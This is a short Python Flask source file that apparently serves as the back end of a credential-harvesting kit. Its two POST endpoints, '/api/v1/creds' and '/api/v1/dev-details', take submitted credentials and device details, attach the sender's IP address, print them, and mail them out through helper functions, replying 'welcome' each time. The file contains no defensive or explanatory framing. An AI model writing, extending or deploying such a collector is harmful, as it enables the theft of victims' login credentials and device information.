#Author : hunter.target.001@gmail.com
#File created on 06 Oct 2020 9:18 PM

from flask import request, Blueprint
import utils

apis = Blueprint('apis', __name__)

@apis.route('/api/v1/creds', methods=['POST'])
def creds_post():
    creds=request.json
    ip = request.remote_addr
    creds['ip'] = ip
    print(creds)

    utils.send_creds_to_mail(creds)

    return "welcome"

@apis.route('/api/v1/dev-details', methods=['POST'])
def dev_details_post():

    dev_details = request.json
    ip = request.remote_addr
    dev_details['ip'] = ip
    print(dev_details)
    utils.send_dev_details_to_mail(dev_details)

    return 'welcome'





